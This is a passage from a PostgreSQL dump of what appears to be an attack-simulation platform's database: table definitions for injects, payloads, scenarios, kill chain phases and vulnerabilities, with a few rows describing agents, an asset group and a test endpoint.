    inject_id character varying(255) NOT NULL,
    asset_group_id character varying(255) NOT NULL
);


ALTER TABLE public.injects_asset_groups OWNER TO "user";

--
-- Name: injects_assets; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_assets (
    inject_id character varying(255) NOT NULL,
    asset_id character varying(255) NOT NULL
);


ALTER TABLE public.injects_assets OWNER TO "user";

--
-- Name: injects_dependencies; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_dependencies (
    inject_parent_id character varying(255) NOT NULL,
    inject_children_id character varying(255) NOT NULL,
    dependency_condition jsonb,
    dependency_created_at timestamp with time zone DEFAULT now(),
    dependency_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.injects_dependencies OWNER TO "user";

--
-- Name: injects_documents; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_documents (
    inject_id character varying(255) NOT NULL,
    document_id character varying(255) NOT NULL,
    document_attached boolean DEFAULT false
);


ALTER TABLE public.injects_documents OWNER TO "user";

--
-- Name: injects_expectations; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_expectations (
    inject_expectation_id character varying(255) NOT NULL,
    inject_expectation_created_at timestamp with time zone DEFAULT now() NOT NULL,
    inject_expectation_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    user_id character varying(255),
    exercise_id character varying(256),
    inject_id character varying(256) NOT NULL,
    team_id character varying(256),
    inject_expectation_type character varying(255) NOT NULL,
    inject_expectation_score double precision,
    article_id character varying(255),
    challenge_id character varying(255),
    inject_expectation_expected_score double precision DEFAULT 100 NOT NULL,
    inject_expectation_name character varying(255),
    inject_expectation_description text,
    inject_expectation_group boolean DEFAULT false,
    asset_id character varying(256),
    asset_group_id character varying(256),
    inject_expectation_results json,
    inject_expectation_signatures json,
    inject_expiration_time bigint NOT NULL,
    agent_id character varying(256)
);


ALTER TABLE public.injects_expectations OWNER TO "user";

--
-- Name: injects_expectations_traces; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_expectations_traces (
    inject_expectation_trace_id character varying(255) NOT NULL,
    inject_expectation_trace_expectation character varying(255) NOT NULL,
    inject_expectation_trace_source_id character varying(255) NOT NULL,
    inject_expectation_trace_alert_name text,
    inject_expectation_trace_alert_link text,
    inject_expectation_trace_date timestamp(0) with time zone,
    inject_expectation_trace_created_at timestamp with time zone DEFAULT now() NOT NULL,
    inject_expectation_trace_updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.injects_expectations_traces OWNER TO "user";

--
-- Name: injects_statuses; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_statuses (
    status_id character varying(255) NOT NULL,
    status_inject character varying(255) DEFAULT NULL::character varying,
    status_name character varying(255) DEFAULT NULL::character varying,
    tracking_sent_date timestamp(0) with time zone DEFAULT NULL::timestamp with time zone,
    tracking_end_date timestamp without time zone,
    status_payload_output json
);


ALTER TABLE public.injects_statuses OWNER TO "user";

--
-- Name: injects_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_tags (
    inject_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.injects_tags OWNER TO "user";

--
-- Name: injects_teams; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_teams (
    inject_id character varying(255) NOT NULL,
    team_id character varying(255) NOT NULL
);


ALTER TABLE public.injects_teams OWNER TO "user";

--
-- Name: injects_tests_statuses; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.injects_tests_statuses (
    status_id character varying(255) NOT NULL,
    status_name character varying(255) NOT NULL,
    tracking_sent_date timestamp without time zone,
    tracking_end_date timestamp without time zone,
    status_inject character varying(255) NOT NULL,
    status_created_at timestamp with time zone DEFAULT now() NOT NULL,
    status_updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.injects_tests_statuses OWNER TO "user";

--
-- Name: kill_chain_phases; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.kill_chain_phases (
    phase_id character varying(255) NOT NULL,
    phase_created_at timestamp with time zone DEFAULT now() NOT NULL,
    phase_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    phase_name character varying(255) NOT NULL,
    phase_kill_chain_name character varying(255) NOT NULL,
    phase_order bigint NOT NULL,
    phase_description text,
    phase_shortname character varying(255) NOT NULL,
    phase_external_id character varying(255) NOT NULL,
    phase_stix_id character varying(255)
);


ALTER TABLE public.kill_chain_phases OWNER TO "user";

--
-- Name: lessons_answers; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.lessons_answers (
    lessons_answer_id character varying(255) NOT NULL,
    lessons_answer_created_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_answer_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_answer_positive text,
    lessons_answer_negative text,
    lessons_answer_score integer NOT NULL,
    lessons_answer_question character varying(255) NOT NULL,
    lessons_answer_user character varying(255)
);


ALTER TABLE public.lessons_answers OWNER TO "user";

--
-- Name: lessons_categories; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.lessons_categories (
    lessons_category_id character varying(255) NOT NULL,
    lessons_category_created_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_category_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_category_name character varying(255) NOT NULL,
    lessons_category_description text,
    lessons_category_order integer NOT NULL,
    lessons_category_exercise character varying(255),
    lessons_category_scenario character varying(255)
);


ALTER TABLE public.lessons_categories OWNER TO "user";

--
-- Name: lessons_categories_teams; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.lessons_categories_teams (
    team_id character varying(255) NOT NULL,
    lessons_category_id character varying(255) NOT NULL
);


ALTER TABLE public.lessons_categories_teams OWNER TO "user";

--
-- Name: lessons_questions; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.lessons_questions (
    lessons_question_id character varying(255) NOT NULL,
    lessons_question_created_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_question_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_question_content text NOT NULL,
    lessons_question_explanation text,
    lessons_question_order integer NOT NULL,
    lessons_question_category character varying(255) NOT NULL
);


ALTER TABLE public.lessons_questions OWNER TO "user";

--
-- Name: lessons_template_categories; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.lessons_template_categories (
    lessons_template_category_id character varying(255) NOT NULL,
    lessons_template_category_created_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_template_category_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_template_category_name character varying(255) NOT NULL,
    lessons_template_category_description text,
    lessons_template_category_order integer NOT NULL,
    lessons_template_category_template character varying(255) NOT NULL
);


ALTER TABLE public.lessons_template_categories OWNER TO "user";

--
-- Name: lessons_template_questions; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.lessons_template_questions (
    lessons_template_question_id character varying(255) NOT NULL,
    lessons_template_question_created_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_template_question_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_template_question_content text NOT NULL,
    lessons_template_question_explanation text,
    lessons_template_question_order integer NOT NULL,
    lessons_template_question_category character varying(255) NOT NULL
);


ALTER TABLE public.lessons_template_questions OWNER TO "user";

--
-- Name: lessons_templates; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.lessons_templates (
    lessons_template_id character varying(255) NOT NULL,
    lessons_template_created_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_template_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    lessons_template_name character varying(255) NOT NULL,
    lessons_template_description text
);


ALTER TABLE public.lessons_templates OWNER TO "user";

--
-- Name: logs; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.logs (
    log_id character varying(255) NOT NULL,
    log_exercise character varying(255) DEFAULT NULL::character varying,
    log_user character varying(255) DEFAULT NULL::character varying,
    log_title character varying(255) NOT NULL,
    log_content text NOT NULL,
    log_created_at timestamp with time zone DEFAULT now() NOT NULL,
    log_updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.logs OWNER TO "user";

--
-- Name: logs_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.logs_tags (
    log_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.logs_tags OWNER TO "user";

--
-- Name: migrations; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.migrations (
    installed_rank integer NOT NULL,
    version character varying(50),
    description character varying(200) NOT NULL,
    type character varying(20) NOT NULL,
    script character varying(1000) NOT NULL,
    checksum integer,
    installed_by character varying(100) NOT NULL,
    installed_on timestamp without time zone DEFAULT now() NOT NULL,
    execution_time integer NOT NULL,
    success boolean NOT NULL
);


ALTER TABLE public.migrations OWNER TO "user";

--
-- Name: mitigations; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.mitigations (
    mitigation_id character varying(255) NOT NULL,
    mitigation_created_at timestamp with time zone DEFAULT now() NOT NULL,
    mitigation_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    mitigation_name character varying(255) NOT NULL,
    mitigation_description text,
    mitigation_external_id character varying(255) NOT NULL,
    mitigation_stix_id character varying(255) NOT NULL,
    mitigation_log_sources text[],
    mitigation_threat_hunting_techniques text
);


ALTER TABLE public.mitigations OWNER TO "user";

--
-- Name: mitigations_attack_patterns; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.mitigations_attack_patterns (
    mitigation_id character varying(255) NOT NULL,
    attack_pattern_id character varying(255) NOT NULL
);


ALTER TABLE public.mitigations_attack_patterns OWNER TO "user";

--
-- Name: notification_rules; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.notification_rules (
    notification_rule_id character varying(255) NOT NULL,
    notification_resource_type character varying(255) NOT NULL,
    notification_resource_id character varying(255) NOT NULL,
    notification_rule_trigger character varying(255) NOT NULL,
    notification_rule_type character varying(255) NOT NULL,
    notification_rule_subject character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL
);


ALTER TABLE public.notification_rules OWNER TO "user";

--
-- Name: objectives; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.objectives (
    objective_id character varying(255) NOT NULL,
    objective_exercise character varying(255) DEFAULT NULL::character varying,
    objective_title character varying(255) DEFAULT NULL::character varying,
    objective_description text,
    objective_priority smallint,
    objective_created_at timestamp with time zone DEFAULT now() NOT NULL,
    objective_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    objective_scenario character varying(255)
);


ALTER TABLE public.objectives OWNER TO "user";

--
-- Name: organizations; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.organizations (
    organization_id character varying(255) NOT NULL,
    organization_name character varying(255) NOT NULL,
    organization_description text,
    organization_created_at timestamp with time zone DEFAULT now() NOT NULL,
    organization_updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.organizations OWNER TO "user";

--
-- Name: organizations_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.organizations_tags (
    organization_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.organizations_tags OWNER TO "user";

--
-- Name: output_parsers; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.output_parsers (
    output_parser_id character varying(255) NOT NULL,
    output_parser_mode character varying(50) NOT NULL,
    output_parser_type character varying(50) NOT NULL,
    output_parser_payload_id character varying(255) NOT NULL,
    output_parser_created_at timestamp with time zone DEFAULT now(),
    output_parser_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.output_parsers OWNER TO "user";

--
-- Name: parameters; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.parameters (
    parameter_id character varying(255) NOT NULL,
    parameter_key character varying(255) NOT NULL,
    parameter_value text NOT NULL
);


ALTER TABLE public.parameters OWNER TO "user";

--
-- Name: pauses; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.pauses (
    pause_id character varying(255) NOT NULL,
    pause_exercise character varying(255) NOT NULL,
    pause_date timestamp(0) with time zone NOT NULL,
    pause_duration bigint
);


ALTER TABLE public.pauses OWNER TO "user";

--
-- Name: payloads; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.payloads (
    payload_id character varying(255) NOT NULL,
    payload_type character varying(255) NOT NULL,
    payload_name character varying(255) NOT NULL,
    payload_description text,
    payload_created_at timestamp with time zone DEFAULT now() NOT NULL,
    payload_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    payload_platforms text[],
    command_executor character varying(255),
    command_content text,
    executable_file character varying(255),
    file_drop_file character varying(255),
    dns_resolution_hostname text,
    network_traffic_ip_src text,
    payload_cleanup_executor character varying(255),
    payload_cleanup_command text,
    payload_arguments json,
    payload_prerequisites json,
    network_traffic_ip_dst text,
    network_traffic_port_src integer,
    network_traffic_port_dst integer,
    network_traffic_protocol character varying(255),
    payload_external_id character varying(255),
    payload_collector character varying(255),
    payload_source character varying(255) DEFAULT 'MANUAL'::character varying,
    payload_status character varying(255) DEFAULT 'UNVERIFIED'::character varying,
    payload_elevation_required boolean DEFAULT false,
    payload_execution_arch character varying(255) DEFAULT 'ALL_ARCHITECTURES'::character varying NOT NULL,
    payload_expectations text[],
    CONSTRAINT chk_payload_cleanup_cmd_consistency CHECK ((((payload_cleanup_executor IS NULL) AND (payload_cleanup_command IS NULL)) OR ((((payload_cleanup_executor)::text <> ''::text) IS TRUE) AND ((payload_cleanup_command <> ''::text) IS TRUE)))),
    CONSTRAINT chk_payload_cmd_consistency CHECK ((((command_executor IS NULL) AND (command_content IS NULL)) OR ((((command_executor)::text <> ''::text) IS TRUE) AND ((command_content <> ''::text) IS TRUE))))
);


ALTER TABLE public.payloads OWNER TO "user";

--
-- Name: payloads_attack_patterns; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.payloads_attack_patterns (
    attack_pattern_id character varying(255) NOT NULL,
    payload_id character varying(255) NOT NULL
);


ALTER TABLE public.payloads_attack_patterns OWNER TO "user";

--
-- Name: payloads_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.payloads_tags (
    payload_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.payloads_tags OWNER TO "user";

--
-- Name: regex_groups; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.regex_groups (
    regex_group_id character varying(255) NOT NULL,
    regex_group_field character varying(50) NOT NULL,
    regex_group_index_values character varying(50) NOT NULL,
    regex_group_contract_output_element_id character varying(255) NOT NULL,
    regex_group_created_at timestamp with time zone DEFAULT now(),
    regex_group_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.regex_groups OWNER TO "user";

--
-- Name: report_informations; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.report_informations (
    report_informations_id uuid NOT NULL,
    report_id uuid NOT NULL,
    report_informations_type character varying(255) NOT NULL,
    report_informations_display boolean DEFAULT false
);


ALTER TABLE public.report_informations OWNER TO "user";

--
-- Name: report_inject_comment; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.report_inject_comment (
    report_id uuid NOT NULL,
    inject_id character varying(255) NOT NULL,
    comment text
);


ALTER TABLE public.report_inject_comment OWNER TO "user";

--
-- Name: reports; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.reports (
    report_id uuid NOT NULL,
    report_name character varying(255) NOT NULL,
    report_global_observation text,
    report_created_at timestamp with time zone DEFAULT now(),
    report_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.reports OWNER TO "user";

--
-- Name: reports_exercises; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.reports_exercises (
    report_id uuid NOT NULL,
    exercise_id character varying(255) NOT NULL
);


ALTER TABLE public.reports_exercises OWNER TO "user";

--
-- Name: roles; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.roles (
    role_id character varying(255) NOT NULL,
    role_name character varying(255) NOT NULL,
    role_created_at timestamp with time zone DEFAULT now() NOT NULL,
    role_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    role_description text
);


ALTER TABLE public.roles OWNER TO "user";

--
-- Name: roles_capabilities; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.roles_capabilities (
    role_id character varying(255) NOT NULL,
    capability character varying(255) NOT NULL
);


ALTER TABLE public.roles_capabilities OWNER TO "user";

--
-- Name: rule_attributes; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.rule_attributes (
    attribute_id uuid NOT NULL,
    attribute_inject_importer_id uuid,
    attribute_name character varying(255) NOT NULL,
    attribute_columns character varying(255),
    attribute_default_value character varying(255),
    attribute_additional_config public.hstore,
    attribute_created_at timestamp with time zone DEFAULT now(),
    attribute_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.rule_attributes OWNER TO "user";

--
-- Name: scenario_mails_reply_to; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.scenario_mails_reply_to (
    scenario_id character varying(255) NOT NULL,
    scenario_reply_to character varying(255)
);


ALTER TABLE public.scenario_mails_reply_to OWNER TO "user";

--
-- Name: scenarios; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.scenarios (
    scenario_id character varying(255) NOT NULL,
    scenario_name character varying(255) NOT NULL,
    scenario_description text,
    scenario_subtitle text,
    scenario_message_header character varying(255),
    scenario_message_footer character varying(255),
    scenario_mail_from text NOT NULL,
    scenario_created_at timestamp with time zone DEFAULT now() NOT NULL,
    scenario_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    scenario_recurrence character varying(256),
    scenario_recurrence_start timestamp without time zone,
    scenario_recurrence_end timestamp without time zone,
    scenario_category character varying(255),
    scenario_severity character varying(255),
    scenario_main_focus character varying(255),
    scenario_external_reference character varying(255),
    scenario_external_url character varying(255),
    scenario_lessons_anonymized boolean DEFAULT false,
    scenario_custom_dashboard character varying(255),
    from_starter_pack boolean DEFAULT false
);


ALTER TABLE public.scenarios OWNER TO "user";

--
-- Name: scenarios_documents; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.scenarios_documents (
    scenario_id character varying(255) NOT NULL,
    document_id character varying(255) NOT NULL
);


ALTER TABLE public.scenarios_documents OWNER TO "user";

--
-- Name: scenarios_exercises; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.scenarios_exercises (
    scenario_id character varying(255) NOT NULL,
    exercise_id character varying(255) NOT NULL
);


ALTER TABLE public.scenarios_exercises OWNER TO "user";

--
-- Name: scenarios_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.scenarios_tags (
    scenario_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.scenarios_tags OWNER TO "user";

--
-- Name: scenarios_teams; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.scenarios_teams (
    scenario_id character varying(255) NOT NULL,
    team_id character varying(255) NOT NULL
);


ALTER TABLE public.scenarios_teams OWNER TO "user";

--
-- Name: scenarios_teams_users; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.scenarios_teams_users (
    scenario_id character varying(255) NOT NULL,
    team_id character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL
);


ALTER TABLE public.scenarios_teams_users OWNER TO "user";

--
-- Name: security_coverage_send_job; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.security_coverage_send_job (
    security_coverage_send_job_id character varying(255) NOT NULL,
    security_coverage_send_job_simulation character varying(255) NOT NULL,
    security_coverage_send_job_status character varying(255) DEFAULT 'PENDING'::character varying NOT NULL,
    security_coverage_send_job_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.security_coverage_send_job OWNER TO "user";

--
-- Name: security_coverages; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.security_coverages (
    security_coverage_id character varying(255) NOT NULL,
    security_coverage_external_id character varying(255) NOT NULL,
    security_coverage_scenario character varying(255),
    security_coverage_name character varying(255) NOT NULL,
    security_coverage_description text,
    security_coverage_scheduling character varying(50) NOT NULL,
    security_coverage_period_start timestamp with time zone,
    security_coverage_period_end timestamp with time zone,
    security_coverage_labels text[],
    security_coverage_attack_pattern_refs jsonb,
    security_coverage_vulnerabilities_refs jsonb,
    security_coverage_content jsonb NOT NULL,
    security_coverage_created_at timestamp with time zone DEFAULT now(),
    security_coverage_updated_at timestamp with time zone DEFAULT now(),
    security_coverage_external_url text
);


ALTER TABLE public.security_coverages OWNER TO "user";

--
-- Name: tag_rule_asset_groups; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.tag_rule_asset_groups (
    tag_rule_id character varying(255) NOT NULL,
    asset_group_id character varying(255) NOT NULL
);


ALTER TABLE public.tag_rule_asset_groups OWNER TO "user";

--
-- Name: tag_rules; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.tag_rules (
    tag_rule_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.tag_rules OWNER TO "user";

--
-- Name: tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.tags (
    tag_id character varying(255) NOT NULL,
    tag_name character varying(255) NOT NULL,
    tag_color character varying(255) DEFAULT '#01478DFF'::character varying,
    tag_created_at timestamp with time zone DEFAULT now() NOT NULL,
    tag_updated_at timestamp with time zone DEFAULT now() NOT NULL
);


ALTER TABLE public.tags OWNER TO "user";

--
-- Name: teams; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.teams (
    team_id character varying(255) NOT NULL,
    team_name character varying(255) NOT NULL,
    team_description text,
    team_created_at timestamp with time zone DEFAULT now() NOT NULL,
    team_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    team_organization character varying(255),
    team_contextual boolean DEFAULT false
);


ALTER TABLE public.teams OWNER TO "user";

--
-- Name: teams_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.teams_tags (
    team_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.teams_tags OWNER TO "user";

--
-- Name: tokens; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.tokens (
    token_id character varying(255) NOT NULL,
    token_user character varying(255) DEFAULT NULL::character varying,
    token_value character varying(255) NOT NULL,
    token_created_at timestamp with time zone NOT NULL
);


ALTER TABLE public.tokens OWNER TO "user";

--
-- Name: users; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.users (
    user_id character varying(255) NOT NULL,
    user_organization character varying(255) DEFAULT NULL::character varying,
    user_firstname character varying(255),
    user_lastname character varying(255),
    user_email character varying(255) NOT NULL,
    user_phone character varying(255) DEFAULT NULL::character varying,
    user_phone2 character varying(255) DEFAULT NULL::character varying,
    user_pgp_key text,
    user_password character varying(255) DEFAULT NULL::character varying,
    user_admin boolean NOT NULL,
    user_status smallint NOT NULL,
    user_lang character varying(255) DEFAULT NULL::character varying,
    user_created_at timestamp with time zone DEFAULT now() NOT NULL,
    user_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    user_country character varying(255),
    user_city character varying(255),
    user_theme character varying(255)
);


ALTER TABLE public.users OWNER TO "user";

--
-- Name: users_groups; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.users_groups (
    group_id character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL
);


ALTER TABLE public.users_groups OWNER TO "user";

--
-- Name: users_tags; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.users_tags (
    user_id character varying(255) NOT NULL,
    tag_id character varying(255) NOT NULL
);


ALTER TABLE public.users_tags OWNER TO "user";

--
-- Name: users_teams; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.users_teams (
    team_id character varying(255) NOT NULL,
    user_id character varying(255) NOT NULL
);


ALTER TABLE public.users_teams OWNER TO "user";

--
-- Name: variables; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.variables (
    variable_id character varying(255) NOT NULL,
    variable_key character varying(255) NOT NULL,
    variable_value character varying(255),
    variable_description text,
    variable_type character varying(255) NOT NULL,
    variable_exercise character varying(255) DEFAULT NULL::character varying,
    variable_created_at timestamp with time zone DEFAULT now() NOT NULL,
    variable_updated_at timestamp with time zone DEFAULT now() NOT NULL,
    variable_scenario character varying(255) DEFAULT NULL::character varying
);


ALTER TABLE public.variables OWNER TO "user";

--
-- Name: vulnerabilities; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.vulnerabilities (
    vulnerability_id character varying(255) NOT NULL,
    vulnerability_external_id character varying(255) NOT NULL,
    vulnerability_source_identifier character varying(255),
    vulnerability_published timestamp with time zone,
    vulnerability_description text,
    vulnerability_vuln_status character varying(255) DEFAULT 'ANALYZED'::character varying,
    vulnerability_cvss_v31 numeric(3,1),
    vulnerability_cisa_exploit_add timestamp with time zone,
    vulnerability_cisa_action_due timestamp with time zone,
    vulnerability_cisa_required_action text,
    vulnerability_cisa_vulnerability_name text,
    vulnerability_remediation text,
    vulnerability_created_at timestamp with time zone DEFAULT now(),
    vulnerability_updated_at timestamp with time zone DEFAULT now(),
    CONSTRAINT chk_cvss_range CHECK (((vulnerability_cvss_v31 >= 0.0) AND (vulnerability_cvss_v31 <= 10.0)))
);


ALTER TABLE public.vulnerabilities OWNER TO "user";

--
-- Name: vulnerabilities_cwes; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.vulnerabilities_cwes (
    vulnerability_id character varying(255) NOT NULL,
    cwe_id character varying(255) NOT NULL
);


ALTER TABLE public.vulnerabilities_cwes OWNER TO "user";

--
-- Name: vulnerability_reference_urls; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.vulnerability_reference_urls (
    vulnerability_id character varying(255) NOT NULL,
    vulnerability_reference_url text NOT NULL
);


ALTER TABLE public.vulnerability_reference_urls OWNER TO "user";

--
-- Name: widgets; Type: TABLE; Schema: public; Owner: user
--

CREATE TABLE public.widgets (
    widget_id character varying(255) NOT NULL,
    widget_type character varying(255) NOT NULL,
    widget_config jsonb,
    widget_layout jsonb,
    widget_custom_dashboard character varying(255),
    widget_created_at timestamp with time zone DEFAULT now(),
    widget_updated_at timestamp with time zone DEFAULT now()
);


ALTER TABLE public.widgets OWNER TO "user";

--
-- Data for Name: agents; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.agents (agent_id, agent_asset, agent_privilege, agent_deployment_mode, agent_executed_by_user, agent_executor, agent_version, agent_parent, agent_inject, agent_process_name, agent_external_reference, agent_last_seen, agent_created_at, agent_updated_at, agent_cleared_at) FROM stdin;
78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	standard	session	desktop-3tj3mve\\insa	2f9a0936-c327-4e95-b406-d161d32a2501	2.0.4	\N	\N	\N	01ce79b580406fc12ba48a8fb1093313682e67851e4ccdd075959d14d23db157	2026-01-16 10:17:08.338986	2026-01-09 14:20:23.330683+00	2026-01-09 14:20:23.330684+00	2026-01-09 14:20:23.330685
19213a51-c939-4f40-9607-b93608da8f90	ae65e95f-1db6-4423-a763-1759132f960c	admin	session	win-mqo4cp3093b\\administrateur	2f9a0936-c327-4e95-b406-d161d32a2501	2.0.4	\N	\N	\N	df43caaac284884f708880d3118212fc744442b58389a5dfb7bcc086dd15acf8	2026-01-16 10:17:50.766813	2026-01-09 14:20:15.765038+00	2026-01-09 14:20:15.765042+00	2026-01-09 14:20:15.765044
\.


--
-- Data for Name: articles; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.articles (article_id, article_created_at, article_updated_at, article_name, article_content, article_channel, article_exercise, article_author, article_shares, article_likes, article_comments, article_scenario) FROM stdin;
\.


--
-- Data for Name: articles_documents; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.articles_documents (article_id, document_id) FROM stdin;
\.


--
-- Data for Name: asset_agent_jobs; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.asset_agent_jobs (asset_agent_id, asset_agent_created_at, asset_agent_updated_at, asset_agent_inject, asset_agent_command, asset_agent_agent) FROM stdin;
\.


--
-- Data for Name: asset_groups; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.asset_groups (asset_group_id, asset_group_name, asset_group_description, asset_group_created_at, asset_group_updated_at, asset_group_dynamic_filter, asset_group_external_reference) FROM stdin;
b672bfa8-ccc5-46e8-9a0e-2744e1c10c75	All endpoints	\N	2026-01-09 14:19:23.090222+00	2026-01-09 14:19:23.090241+00	{"mode":"or","filters":[{"key":"endpoint_platform","mode":"or","values":[],"operator":"not_empty"}]}	\N
\.


--
-- Data for Name: asset_groups_assets; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.asset_groups_assets (asset_group_id, asset_id) FROM stdin;
\.


--
-- Data for Name: asset_groups_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.asset_groups_tags (asset_group_id, tag_id) FROM stdin;
\.


--
-- Data for Name: assets; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.assets (asset_id, asset_type, asset_name, asset_description, asset_created_at, asset_updated_at, endpoint_ips, endpoint_hostname, endpoint_platform, endpoint_mac_addresses, asset_external_reference, endpoint_arch, security_platform_type, security_platform_logo_light, security_platform_logo_dark, endpoint_seen_ip, endpoint_is_eol) FROM stdin;
0357db48-9af3-4664-b239-9d1bb0ed5aa9	Endpoint	honey.scanme.sh	\N	2026-01-09 14:19:23.066329+00	2026-01-09 14:19:23.06635+00	{67.205.158.113}	honey.scanme.sh	Generic	{}	\N	x86_64	\N	\N	\N	\N	t
